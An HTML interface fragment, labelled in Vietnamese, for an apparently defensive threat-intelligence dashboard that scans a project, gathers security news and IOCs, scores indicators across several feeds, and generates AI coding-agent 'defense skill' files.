        <div id="stepBadge2" class="WizardStepBadge" style="font-weight:600; padding:6px 14px; border-radius:20px; font-size:12px; background:#e2e8f0; color:#475569;">
          2. Kết Quả & Scope
        </div>
        <span style="color:#94a3b8; font-weight:bold;">➔</span>
        <div id="stepBadge3" class="WizardStepBadge" style="font-weight:600; padding:6px 14px; border-radius:20px; font-size:12px; background:#e2e8f0; color:#475569;">
          3. Cào Báo Theo Mục Đích
        </div>
        <span style="color:#94a3b8; font-weight:bold;">➔</span>
        <div id="stepBadge4" class="WizardStepBadge" style="font-weight:600; padding:6px 14px; border-radius:20px; font-size:12px; background:#e2e8f0; color:#475569;">
          4. Sinh Gói Kỹ Năng
        </div>
        <span style="color:#94a3b8; font-weight:bold;">➔</span>
        <div id="stepBadge5" class="WizardStepBadge" style="font-weight:600; padding:6px 14px; border-radius:20px; font-size:12px; background:#e2e8f0; color:#475569;">
          5. Vá Mã Nguồn & Kiểm Thử
        </div>
      </div>

      <!-- STEP 1 CONTAINER -->
      <div id="wizardCard1" class="WizardCard" style="display:block;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 1: Nhập Dự Án Mục Tiêu Cần Bảo Vệ</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:16px;">
          Hệ thống sẽ quét mã nguồn của dự án đích để nhận diện công nghệ (PHP, Node, Python, Docker...) và tự động định danh Phân hệ bảo vệ tương ứng.
        </p>

        <div style="display:grid; grid-template-columns:1fr; gap:12px; margin-bottom:16px;">
          <div>
            <label class="FieldLabel" style="font-size:12px; font-weight:600; color:#334155; margin-bottom:4px; display:block;">ĐƯỜNG DẪN THƯ MỤC DỰ ÁN MỤC TIÊU</label>
            <input type="text" id="wizardInputTarget" class="CleanInput" style="width:100%; font-family:monospace; padding:9px 12px;" value="./target_projects/My_Website" placeholder="Ví dụ: D:/my-web-app hoặc ./target_projects/sample_web" />
          </div>
          <div>
            <label class="FieldLabel" style="font-size:12px; font-weight:600; color:#334155; margin-bottom:4px; display:block;">HOẶC NHẬP LINK GITHUB (TỰ ĐỘNG CLONE VỀ TARGET_PROJECTS/)</label>
            <input type="text" id="wizardInputClone" class="CleanInput" style="width:100%; font-family:monospace; padding:9px 12px;" placeholder="https://github.com/username/vulnerable-web-app.git" />
          </div>
        </div>

        <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:18px;">
          <span style="font-size:12px; color:#64748b; font-weight:600;">DÙNG THỬ NHANH:</span>
          <button type="button" class="CleanBtn" style="font-size:12px; padding:4px 10px; background:#f1f5f9;" onclick="setWizardDemo('php')">Demo Web PHP Lỗi (RCE)</button>
          <button type="button" class="CleanBtn" style="font-size:12px; padding:4px 10px; background:#f1f5f9;" onclick="setWizardDemo('docker')">Demo Docker Security</button>
        </div>

        <button type="button" class="CleanBtn btn-primary" style="padding:10px 22px; font-size:14px; font-weight:700;" onclick="wizardExecuteStep1()">
          [ 🚀 BẮT ĐẦU QUÉT DỰ ÁN ]
        </button>
      </div>

      <!-- STEP 2 CONTAINER -->
      <div id="wizardCard2" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 2: Kết Quả Nhận Diện & Phân Loại Scope</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:14px;">Quá trình quét tĩnh hoàn tất 100%. Dưới đây là hồ sơ công nghệ và phân hệ được gán tự động:</p>

        <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:6px; padding:14px; margin-bottom:16px;">
          <div style="margin-bottom:8px;">
            <b style="color:#334155;">Thư mục dự án:</b> <span id="wzTargetName" style="font-family:monospace; color:#2563eb;">-</span>
          </div>
          <div style="margin-bottom:8px;">
            <b style="color:#334155;">Công nghệ nhận diện:</b> <span id="wzTechsBadge" style="display:inline-flex; gap:6px; flex-wrap:wrap;">-</span>
          </div>
          <div style="margin-bottom:8px;">
            <b style="color:#334155;">Phân hệ bảo vệ gán tự động:</b> <span id="wzScopeBadge" style="font-weight:700; color:#15803d; background:#dcfce7; padding:2px 8px; border-radius:4px;">-</span>
          </div>
          <div>
            <b style="color:#334155;">Chu kỳ quét khuyến nghị:</b> <span id="wzCadenceLabel" style="color:#b45309; font-weight:600;">-</span>
          </div>
        </div>

        <div style="display:flex; gap:12px;">
          <button type="button" class="CleanBtn btn-primary" style="padding:10px 22px; font-weight:700;" onclick="wizardGotoStep(3)">
            TỚI BƯỚC TIẾP THEO: CÀO BÁO CTI THEO PHÂN HỆ ➔
          </button>
          <button type="button" class="CleanBtn" onclick="wizardGotoStep(1)">Quay Lại Bước 1</button>
        </div>
      </div>

      <!-- STEP 3 CONTAINER -->
      <div id="wizardCard3" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 3: Cào Bài Báo & Lọc Tri Thức CTI Theo Mục Đích</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:14px;">
          Hệ thống KHÔNG tải dữ liệu rác lan man. Dữ liệu chỉ được cào và học dựa trên đúng mục đích của Scope vừa xác định.
        </p>

        <div style="display:flex; gap:20px; align-items:center; margin-bottom:16px; background:#f8fafc; padding:12px; border-radius:6px; border:1px solid #e2e8f0;">
          <b style="font-size:13px; color:#334155;">Chọn mốc dữ liệu lịch sử:</b>
          <label style="font-size:13px; cursor:pointer;"><input type="radio" name="wzHistory" value="1"> 1 Năm gần nhất</label>
          <label style="font-size:13px; cursor:pointer;"><input type="radio" name="wzHistory" value="3" checked> 3 Năm (2024 - 2026, Khuyến nghị)</label>
          <label style="font-size:13px; cursor:pointer;"><input type="radio" name="wzHistory" value="5"> 5 Năm (Deep Audit)</label>
          <button type="button" class="CleanBtn btn-primary" style="padding:6px 14px; font-size:12px;" onclick="wizardExecuteCrawl()">
            [ BẮT ĐẦU CÀO & ĐỐI CHIẾU ]
          </button>
        </div>

        <div id="wzCrawlResultBox" style="display:none; background:#f8fafc; border:1px solid #cbd5e1; border-radius:6px; padding:14px; margin-bottom:16px;">
          <div style="color:#15803d; font-weight:700; margin-bottom:6px;">✓ ĐÃ TỔNG HỢP TRI THỨC CTI CHO PHÂN HỆ THÀNH CÔNG:</div>
          <div style="margin-bottom:6px;">- Số bài báo liên quan trong Scope: <b id="wzTotalArts">0</b> bài | Số chỉ số IOC đã học: <b id="wzTotalIocs">0</b> IOCs.</div>
          <div style="margin-bottom:6px;">- <b>Bài báo đe dọa cao nhất đối với mã nguồn của bạn:</b></div>
          <div style="padding:10px; background:#ffffff; border:1px solid #e2e8f0; border-radius:4px; margin-bottom:8px;">
            <b id="wzBestTitle" style="color:#b91c1c;">-</b>
            <div id="wzBestCves" style="margin-top:4px; font-family:monospace; color:#2563eb; font-size:12px;">-</div>
            <p id="wzExcerpt" style="font-size:12px; color:#64748b; margin-top:6px; font-style:italic;">-</p>
          </div>
        </div>

        <div style="display:flex; gap:12px;">
          <button type="button" id="btnNextStep4" class="CleanBtn btn-primary" style="padding:10px 22px; font-weight:700;" onclick="wizardExecuteStep4()" disabled>
            TỚI BƯỚC TIẾP THEO: SINH BỘ KỸ NĂNG TÁC TỬ (SKILL.MD) ➔
          </button>
          <button type="button" class="CleanBtn" onclick="wizardGotoStep(2)">Quay Lại Bước 2</button>
        </div>
      </div>

      <!-- STEP 4 CONTAINER -->
      <div id="wizardCard4" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 4: Sinh Gói Kỹ Năng Tác Tử Động (xAI Agentic Skill Package)</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:14px;">
          Đóng gói tri thức thành trọn bộ 5 thành phần: SKILL.md, Scripts, Rules, References (xAI), Examples.
        </p>

        <div id="wzSkillResultBox" style="background:#f8fafc; border:1px solid #cbd5e1; border-radius:6px; padding:14px; margin-bottom:16px;">
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
            <div>
              <b style="font-size:14px; color:#0f172a;">Gói Kỹ Năng:</b> <span id="wzSkillName" style="font-family:monospace; color:#2563eb; font-weight:bold;">-</span>
            </div>
            <div style="font-size:13px; font-weight:bold; background:#eff6ff; color:#1d4ed8; padding:3px 10px; border-radius:4px; border:1px solid #bfdbfe;">
              TRUST SCORE: <span id="wzTrustScore">93.6</span> / 100 (Dual-Loop 100% TP / 0% FP)
            </div>
          </div>

          <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:12px;">
            <div style="background:#ffffff; border:1px solid #e2e8f0; border-radius:4px; padding:10px; font-size:12px;">
              <b style="color:#334155;">CẤU TRÚC GÓI KỸ NĂNG 5 THÀNH PHẦN:</b>
              <ul style="margin-left:18px; margin-top:6px; line-height:1.6; color:#475569;">
                <li><code>manifest.json</code>: Schema định danh công cụ & quyền</li>
                <li><code>SKILL.md</code>: Hướng dẫn tư duy & quy trình SOP cho AI</li>
                <li><code>scripts/</code>: <code>verify_exploit.py</code>, <code>apply_virtual_patch.py</code></li>
                <li><code>rules/</code>: WAF ModSecurity, Suricata DPI, Firewall blocklist</li>
                <li><code>references/</code>: Toàn văn CTI, STIX 2.1, vết kiểm toán xAI</li>
                <li><code>examples/</code>: Code mẫu dính lỗi vs. Code mẫu an toàn</li>
              </ul>
            </div>
            <div style="background:#ffffff; border:1px solid #e2e8f0; border-radius:4px; padding:10px; font-size:12px;">
              <b style="color:#334155;">ĐÃ TỰ ĐỘNG CÀI ĐẶT 15 NỀN TẢNG AGENT LỚN:</b>
              <ul style="margin-left:18px; margin-top:6px; line-height:1.6; color:#15803d; font-family:monospace; max-height:120px; overflow-y:auto;">
                <li>✓ Claude Code: CLAUDE.md &amp; .claude/skills/</li>
                <li>✓ Cursor: .cursor/rules/*.mdc &amp; .cursorrules</li>
                <li>✓ OpenAI Codex &amp; ChatGPT: CODEX.md &amp; OPENAI.md</li>
                <li>✓ Antigravity &amp; Gemini: .gemini/skills/ &amp; rules/</li>
                <li>✓ Aider AI: .aider.conf.yml &amp; CONVENTIONS.md</li>
                <li>✓ Cline &amp; Roo Code: .clinerules &amp; .roomodes</li>
                <li>✓ Continue.dev: .continue/config.json &amp; prompts/</li>
                <li>✓ Devin AI: DEVIN.md &amp; .devin/instructions.md</li>
                <li>✓ Windsurf Cascade: .windsurfrules</li>
                <li>✓ GitHub Copilot: .github/copilot-instructions.md</li>
                <li>✓ JetBrains AI / Junie: .jetbrains/ai-instructions.md</li>
                <li>✓ Zed Editor: .zed/settings.json</li>
                <li>✓ Amazon Q &amp; Sourcegraph Cody</li>
                <li>✓ defense_skills/<span class="wzShortSkill">skill</span>/ (Universal RFC)</li>
                <li>✓ AGENT_REMEDIATION_GUIDE.md (Master SOP)</li>
              </ul>
            </div>
          </div>
        </div>

        <div style="display:flex; gap:12px;">
          <button type="button" class="CleanBtn btn-primary" style="padding:10px 22px; font-weight:700;" onclick="wizardGotoStep(5)">
            TỚI BƯỚC TIẾP THEO: VÁ MÃ NGUỒN & KIỂM THỬ ➔
          </button>
          <button type="button" class="CleanBtn" onclick="wizardGotoStep(3)">Quay Lại Bước 3</button>
        </div>
      </div>

      <!-- STEP 5 CONTAINER -->
      <div id="wizardCard5" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 5: Hành Động Hậu Kỹ Năng (Post-Skill Action Protocol)</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:14px;">
          Từ gói kỹ năng đã sinh, AI Agent thực hiện kiểm thử thực nghiệm, kích hoạt lá chắn WAF và tự động vá tận gốc mã nguồn.
        </p>

        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:10px; margin-bottom:16px;">
          <button type="button" class="CleanBtn" style="padding:10px 12px; font-size:12.5px; font-weight:600; text-align:left; background:#fef2f2; border:1px solid #fca5a5; color:#991b1b;" onclick="wizardRunProbe()">
            1. Chạy Probe Kiểm Thử (verify_exploit.py)
          </button>
          <button type="button" class="CleanBtn" style="padding:10px 12px; font-size:12.5px; font-weight:600; text-align:left; background:#fffbeb; border:1px solid #fcd34d; color:#92400e;" onclick="wizardRunVirtualPatch()">
            2. Bật Lá Chắn WAF Proxy (Cổng 8766)
          </button>
          <button type="button" class="CleanBtn" style="padding:10px 12px; font-size:12.5px; font-weight:600; text-align:left; background:#f0fdf4; border:1px solid #86efac; color:#166534;" onclick="wizardRunRemediate()">
            3. Tự Động Vá Mã Nguồn (Auto-Refactor)
          </button>
          <button type="button" class="CleanBtn" style="padding:10px 12px; font-size:12.5px; font-weight:600; text-align:left; background:#eff6ff; border:1px solid #93c5fd; color:#1e40af;" onclick="wizardRunPostVerify()">
            4. Tái Kiểm Thử Xác Nhận An Toàn
          </button>
        </div>

        <div id="wzActionLogBox" style="background:#0f172a; color:#38bdf8; font-family:monospace; font-size:12px; padding:14px; border-radius:6px; min-height:120px; white-space:pre-wrap; margin-bottom:16px;">
[*] Trạng thái: Sẵn sàng thực thi 4 thao tác hậu kỹ năng. Hãy bấm vào nút hành động phía trên...
        </div>

        <div style="display:flex; gap:12px;">
          <button type="button" class="CleanBtn btn-primary" onclick="alert('CHÚC MỪNG: Chu trình 5 pha tự hành đã hoàn tất toàn diện!')">
            ✓ HOÀN TẤT TOÀN BỘ QUY TRÌNH
          </button>
          <button type="button" class="CleanBtn" onclick="wizardGotoStep(1)">Bắt Đầu Lại Từ Đầu</button>
        </div>
      </div>
    </section>

    <!-- MỤC 1: BÀI BÁO & HIGHLIGHT IOC -->

      <div class="BoxLegend">1. NGUỒN BÁO VÀ VĂN BẢN GỐC HIGHLIGHT</div>

      <!-- LIVE AI AGENT ACTIVITY TICKER -->
      <div class="LiveTickerBar">
        <span class="LivePulseDot"></span>
        <b style="color:var(--primary); font-size:12px; letter-spacing:0.04em;">NHẬT KÝ TÁC TỬ AI (LIVE STREAM):</b>
        <span id="liveTickerText" style="color:var(--text-main); font-size:13px; font-family:var(--font-mono); flex:1;">
          Hệ thống AI Agent đang sẵn sàng. Đang giám sát 6 nguồn OSINT thời gian thực...
        </span>
        <span id="liveTickerTime" style="color:var(--text-muted); font-size:11.5px; font-family:var(--font-mono);">
          Live
        </span>
      </div>

      <div class="ToolbarRow">
        <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
          <span class="FieldLabel" style="margin:0;">LỌC NGUỒN:</span>
          <select class="CleanSelect" onchange="filterBySource(this.value, this)">
            <option value="ALL">Tất cả nguồn (Gộp 4 bài đầu)</option>
            <option value="NEW_ONLY">Bài mới quét live</option>
            <option value="TheHackerNews">TheHackerNews</option>
            <option value="Securelist">Securelist (Kaspersky)</option>
            <option value="Check Point">Check Point Research</option>
            <option value="SentinelOne">SentinelOne Labs</option>
            <option value="DFIR">The DFIR Report</option>
            <option value="CISA">CISA KEV (Mỹ)</option>
            <option value="YEAR_2026">Kho tri thức 2026 (3,087 bài &amp; CVEs)</option>
            <option value="YEAR_2025">Kho tri thức 2025 (2,094 bài &amp; CVEs)</option>
            <option value="YEAR_2024">Kho tri thức 2024 (1,948 bài &amp; CVEs)</option>
            <option value="OLD_ONLY">Kho lưu trữ bài cũ</option>
          </select>

          <span class="FieldLabel" style="margin:0; margin-left:6px;">HIỂN THỊ:</span>
          <select class="CleanSelect" id="feedStatusFilter" onchange="renderNewsGrid()">
            <option value="QUEUE" selected>Hàng đợi Live (Chờ &amp; Đang xử lý)</option>
            <option value="processing">Chỉ bài Đang xử lý...</option>
            <option value="pending">Chỉ bài Chờ xử lý</option>
            <option value="completed">Chỉ bài Đã xử lý (Xem lại)</option>
            <option value="ALL">Tất cả bài trong kho</option>
          </select>

          <button class="CleanBtn" id="btnQueueControl" onclick="toggleAutoQueueManual()">Dừng Hàng Đợi</button>
        </div>

        <div id="sourceWebsitesList" style="display:flex; gap:6px; flex-wrap:wrap;"></div>
      </div>

      <div class="SplitWorkspace">
        <div class="FeedColumn" id="newsGrid">
          <div style="padding:14px; color:var(--text-muted);">Đang tải danh sách bài báo...</div>
        </div>

        <div class="ReaderColumn" id="highlightViewerBox">
          <div class="ReaderHeader">
            <span>VĂN BẢN NGUYÊN BẢN TỪ BÁO CÁO GỐC</span>
            <div style="display:flex; gap:10px; font-size:11.5px;">
              <span style="color:var(--danger); font-weight:600;">[Độc hại IP1/C2]</span>
              <span style="color:var(--safe); font-weight:600;">[An toàn IP2]</span>
              <span style="color:var(--amber); font-weight:600;">[Lỗ hổng CVE]</span>
            </div>
          </div>
          <div class="ReaderBody" id="highlightedArticleView">Đang tải nội dung bài báo...</div>
        </div>
      </div>

      <div id="attackPairsBox" style="margin-top:12px; display:flex; flex-direction:column; gap:6px;"></div>
      <textarea id="articleText" style="display:none;"></textarea>
    </section>

    <!-- MỤC LỊCH SỬ BÀI BÁO ĐÃ HỌC & QUẢN LÝ KHO TRI THỨC -->
    <section class="CyberBox" id="sec-history">
      <div class="BoxLegend">LỊCH SỬ BÀI BÁO ĐÃ HỌC VÀ KHO TRI THỨC</div>

      <div class="HistoryStatsGrid">
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">TỔNG BÀI BÁO ĐÃ HỌC</div>
          <div class="HistoryStatValue" id="statTotalArticles">0 bài</div>
          <div class="HistoryStatSub">Lưu trữ bền vững trong SQLite</div>
        </div>
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">TIẾN TRÌNH THỜI GIAN</div>
          <div class="HistoryStatValue mono" style="font-size:13.5px;" id="statDateRange">-- đến --</div>
          <div class="HistoryStatSub">Sắp xếp theo thứ tự thời gian</div>
        </div>
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">TRẠNG THÁI TIẾN TRÌNH</div>
          <div class="HistoryStatValue" style="font-size:14.5px;" id="statOldVsNew">0 Hoàn thành • 0 Chờ xử lý</div>
          <div class="HistoryStatSub">Đã học và nạp vào CSDL SQLite</div>
        </div>
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">TỔNG CHỈ SỐ IOC ĐÃ GHI NHỚ</div>
          <div class="HistoryStatValue" id="statTotalIocs">0 IOC</div>
          <div class="HistoryStatSub" id="statIocBreakdown">0 IP • 0 Domain • 0 CVE</div>
        </div>
      </div>

      <div class="ToolbarRow" style="gap:10px;">
        <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
          <button class="CleanBtn active" id="btnSortRecentDone" onclick="setHistorySort('RECENT_DONE', this)">Vừa Hoàn Thành</button>
          <button class="CleanBtn" id="btnSortNewest" onclick="setHistorySort('NEWEST', this)">Từ Mới Đến Cũ</button>
          <button class="CleanBtn" id="btnSortOldest" onclick="setHistorySort('OLDEST', this)">Từ Cũ Đến Mới</button>
          <button class="CleanBtn" id="btnSortIoc" onclick="setHistorySort('IOC_DESC', this)">Nhiều IOC Nhất</button>

          <select class="CleanSelect" id="historyStatusFilter" onchange="renderHistoryManager()">
            <option value="COMPLETED" selected>Chỉ bài đã Hoàn thành</option>
            <option value="HAS_HASH">Chỉ bài có Mã Băm Malware (SHA256/MD5)</option>
            <option value="HAS_IP">Chỉ bài có IP C2</option>
            <option value="HAS_CVE">Chỉ bài có Lỗ Hổng CVE</option>
            <option value="ALL">Trạng thái: Tất cả bài báo</option>
            <option value="PENDING">Chỉ bài Chờ xử lý</option>
            <option value="HAS_IOC">Chỉ bài có bất kỳ IOC nào</option>
          </select>

          <select class="CleanSelect" id="historySourceFilter" onchange="renderHistoryManager()">
            <option value="ALL">Nguồn: Tất cả 6 nguồn quốc tế</option>
            <option value="TheHackerNews">TheHackerNews</option>
            <option value="Securelist">Kaspersky Securelist</option>
            <option value="Check Point">Check Point Research</option>
            <option value="SentinelOne">SentinelOne Labs</option>
            <option value="DFIR">The DFIR Report</option>
            <option value="CISA">CISA KEV (Mỹ)</option>
          </select>
        </div>

        <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; flex:1; justify-content:flex-end;">
          <input
            type="text"
            id="historySearchInput"
            class="CleanInput"
            style="min-width:240px; padding:7px 12px;"
            placeholder="Tìm kiếm tiêu đề, IP, CVE, Domain..."
            oninput="renderHistoryManager()"
          />
          <button class="CleanBtn" id="btnCrawlYtd" style="border-color:var(--primary); color:var(--primary);" onclick="triggerCrawlYtd(this)">
            Quét Bổ Sung Dữ Liệu 2026
          </button>
          <button class="CleanBtn btn-primary" onclick="analyzeSelectedHistoryArticles()">
            Phân Tích Đã Chọn (<span id="histSelectedCount">0</span>)
          </button>
        </div>
      </div>

      <div class="TableWrap" style="max-height:420px; overflow-y:auto;">
        <table>
          <thead>
            <tr>
              <th style="width:74px;">
                <input type="checkbox" id="chkAllHistory" onchange="toggleSelectAllHistory(this.checked)" title="Chọn hoặc bỏ chọn tất cả" />
                STT
              </th>
              <th style="width:175px;">NGÀY ĐĂNG / QUÉT NẠP</th>
              <th style="width:150px;">NGUỒN BÁO</th>
              <th>TIÊU ĐỀ BÀI BÁO ĐÃ HỌC</th>
              <th style="width:260px;">CHỈ SỐ IOC TRONG BÀI</th>
              <th style="width:175px;">QUẢN LÝ</th>
            </tr>
          </thead>
          <tbody id="historyTableBody">
            <tr><td colspan="6" style="color:var(--text-muted);">Đang tải lịch sử các bài báo đã học...</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- MỤC 2: BẢNG CHẤM ĐIỂM ĐA NGUỒN 5 LỚP -->
    <section class="CyberBox" id="sec-score">
      <!-- BANNER NGỮ CẢNH HỢP NHẤT (ĐỒNG BỘ MỤC 2 & MỤC 3) -->
      <div id="unifiedScopeBanner" class="UnifiedScopeBanner master">
        <div style="flex:1;">
          <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
            <span class="ScopeTag master" id="scopeTag">TOÀN BỘ KHO TRI THỨC</span>
            <b id="scopeTitle" style="font-size:14px; color:var(--text-main);">Ma Trận Phòng Thủ Hợp Nhất Đa Nguồn</b>
          </div>
          <div id="scopeSubtitle" style="font-size:12px; color:var(--text-muted); margin-top:4px;">
            Tổng hợp tri thức từ toàn bộ các bài báo trong kho CTI SQLite • Bao gồm đầy đủ IP, Domain, CVE và Mã Băm Malware (SHA256/MD5).
          </div>
        </div>
        <div style="display:flex; gap:8px; align-items:center;">
          <button class="CleanBtn btn-primary" id="btnScopeMaster" onclick="loadMasterDefenseMatrix()" style="font-weight:600;">
            Xem Toàn Bộ Kho CTI
          </button>
        </div>
      </div>

      <div class="BoxLegend" style="margin-bottom:12px;">2. HỢP NHẤT ĐA NGUỒN 5 LỚP (ALIENVAULT OTX • ABUSE.CH/VT • ABUSEIPDB/GREYNOISE • SHODAN)</div>

      <div class="AiBriefGrid">
        <div>
          <label class="FieldLabel">NHẬN ĐỊNH NGỮ CẢNH CỦA AI AGENT (LOCAL OLLAMA)</label>
          <div class="AiBriefBox" id="aiPlanBox">Đang chờ phân tích...</div>
        </div>
        <div>
          <label class="FieldLabel">KẾT LUẬN ĐỒNG THUẬN ĐA NGUỒN (SCORE &gt; 80 = CHẶN)</label>
          <div class="AiBriefBox" id="aiReasonBox">Đang chờ chấm điểm...</div>
        </div>
      </div>

      <!-- BỘ LỌC CHUYÊN BIỆT THEO LOẠI CHỈ SỐ IOC -->
      <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px;">
        <div class="IocTypeFilterBar" style="margin-bottom:0;">
          <button class="IocTypeFilterBtn active" id="filterIocAll" onclick="filterScoreTableByType('ALL', this)">Tất Cả (<span id="countIocAll">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocHash" onclick="filterScoreTableByType('HASH', this)">Mã Băm Malware / Hash (<span id="countIocHash">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocIp" onclick="filterScoreTableByType('IP', this)">IP C2 (<span id="countIocIp">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocDomain" onclick="filterScoreTableByType('DOMAIN', this)">Tên Miền (<span id="countIocDomain">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocCve" onclick="filterScoreTableByType('CVE', this)">Lỗ Hổng CVE (<span id="countIocCve">0</span>)</button>
        </div>
        <span style="font-size:12px; color:var(--text-muted);" id="scoreTableNote">Hiển thị các chỉ số nguy hại đã đối chiếu qua 5 nguồn.</span>
      </div>

      <div class="TableWrap" style="max-height:480px; overflow-y:auto;">
        <table>
          <thead>
            <tr>
              <th style="min-width:240px;">CHỈ SỐ IOC</th>
              <th>VAI TRÒ</th>
              <th>ALIENVAULT OTX</th>
              <th>ABUSE.CH / VT</th>
              <th>ABUSEIPDB / GN</th>
              <th>SHODAN (PORT/CVE)</th>
              <th>ĐIỂM FUSION</th>
              <th>PHÁN QUYẾT</th>
              <th>ĐỐI CHIẾU</th>
            </tr>
          </thead>
          <tbody id="scoreTableBody">
            <tr><td colspan="9" style="color:var(--text-muted);">Đang chờ phân tích...</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- MỤC 3: PHÒNG THỦ ĐA TẦNG & GIAO TIẾP FIREWALL -->
    <section class="CyberBox" id="sec-defense">
      <div class="BoxLegend" style="margin-bottom:12px;">3. KHO GÓI KỸ NĂNG TÁC TỬ PHÒNG THỦ TỰ HÀNH (AGENTIC DEFENSE SKILLS HUB)</div>

      <!-- 🎯 KỸ NĂNG TỐI ƯU DUY NHẤT: PHÙ HỢP VỚI MÃ NGUỒN DỰ ÁN CỦA BẠN (TAILORED FOR YOUR CODEBASE) -->
      <div style="background:linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%); border:1px solid #86efac; border-radius:8px; padding:14px 18px; margin-bottom:14px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; box-shadow:0 1px 3px rgba(0,0,0,0.03);">
        <div style="display:flex; align-items:center; gap:14px; flex-wrap:wrap;">
          <div style="background:#16a34a; color:#ffffff; font-weight:700; font-size:12.5px; padding:6px 12px; border-radius:6px; letter-spacing:0.03em; box-shadow:0 1px 2px rgba(0,0,0,0.08);">
            🎯 KỸ NĂNG PHÙ HỢP VỚI MÃ NGUỒN CỦA BẠN
          </div>
          <div>
            <div style="font-size:13.5px; color:#14532d; font-weight:700;">
              Dự án mục tiêu: <span id="lblActiveTargetProject" style="color:#0f172a; font-family:monospace; background:#ffffff; padding:2px 8px; border-radius:4px; border:1px solid #bbf7d0;">My_Website</span>
              <span style="margin-left:8px; font-size:12.5px; font-weight:600; color:#166534;">
                • Ngôn ngữ &amp; Stack: <span id="lblActiveTargetTechs" style="color:#15803d; font-weight:700;">Node.js, Express, React, Vite, MySQL2</span>
              </span>
            </div>
            <div style="font-size:12px; color:#166534; margin-top:3px;">
              ✓ Đã tự động phân tích mã nguồn &amp; loại bỏ 100% CTI / Phân hệ không liên quan (chỉ hiển thị duy nhất bộ kỹ năng phòng thủ khớp với công nghệ của bạn).
            </div>
          </div>
        </div>
        <div style="display:flex; align-items:center; gap:8px;">
          <button class="CleanBtn btn-primary" onclick="recompileActiveProjectSkill()" style="font-size:12px; padding:7px 16px; font-weight:700; background:#16a34a; border-color:#15803d;">
            🔄 Tải Lại Kỹ Năng Dự Án
          </button>
        </div>
      </div>

      <!-- 3 TAB CHÍNH CẤP 1 - THIẾT KẾ GRID KHÔNG BAO GIỜ BỊ RỚT DÒNG -->
      <div style="display:grid; grid-template-columns: 1fr 1fr 1.2fr; gap:8px; margin-bottom:12px;">
        <button id="mainTabBtn_skill" class="CleanBtn MasterTabBtn active" onclick="switchMasterTab('tabSkillMaster', this)" style="padding:10px 14px; font-size:12.5px; font-weight:700; color:#0969da; border-color:#0969da; background:var(--primary-subtle); text-align:center;">
          ★ BỘ KỸ NĂNG TÁC TỬ (SKILL.md)
        </button>
        <button id="mainTabBtn_audit" class="CleanBtn MasterTabBtn" onclick="switchMasterTab('tabAuditMaster', this)" style="padding:10px 14px; font-size:12.5px; font-weight:700; color:#1a7f37; border-color:var(--border-main); background:#ffffff; text-align:center;">
          ✓ THẨM ĐỊNH TIN CẬY &amp; xAI (TRUST AUDIT)
        </button>
        <button id="mainTabBtn_engines" class="CleanBtn MasterTabBtn" onclick="switchMasterTab('tabEnginesMaster', this)" style="padding:10px 14px; font-size:12.5px; font-weight:700; color:var(--text-main); border-color:var(--border-main); background:#ffffff; text-align:center;">
          ⚡ CÔNG CỤ THỰC THI &amp; KIỂM CHỨNG TÁC TỬ (AGENT PLAYBOOK &amp; PROBES)
        </button>
      </div>

      <!-- MASTER TAB 1: BỘ KỸ NĂNG TÁC TỬ (SKILL.md) -->
      <div id="tabSkillMaster" class="MasterTabPanel" style="display:block;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:10px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
          <div>
            <span style="font-size:12px; font-weight:700; color:var(--primary); background:var(--primary-subtle); padding:3px 8px; border-radius:4px; border:1px solid #bfdbfe;">
              ĐÓNG GÓI CHUẨN AGENT DEFENSE SKILL (RFC / OPEN AGENT PROTOCOL)
            </span>
            <span style="font-size:12px; color:var(--text-muted); margin-left:8px;">
              Tệp: <b id="lblSkillMdFilename">SKILL.md (agentic-defense-master-web-suite)</b> • Sẵn sàng nạp cho 15 nền tảng AI Coding Agents
            </span>
          </div>
          <div style="display:flex; gap:8px;">
            <button class="CleanBtn" onclick="copySkillMdToClipboard()">Sao Chép SKILL.md</button>
            <button class="CleanBtn btn-primary" onclick="downloadSkillMdFile()">Tải Về Tệp SKILL.md</button>
          </div>
        </div>
        <pre id="outSkillMd" style="max-height:650px; overflow-y:auto; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.45; background:#f6f8fa; color:#24292f; padding:14px; border:1px solid #d0d7de; border-radius:6px;">Đang biên dịch Bộ Kỹ Năng Tác Tử Phòng Thủ...</pre>
      </div>

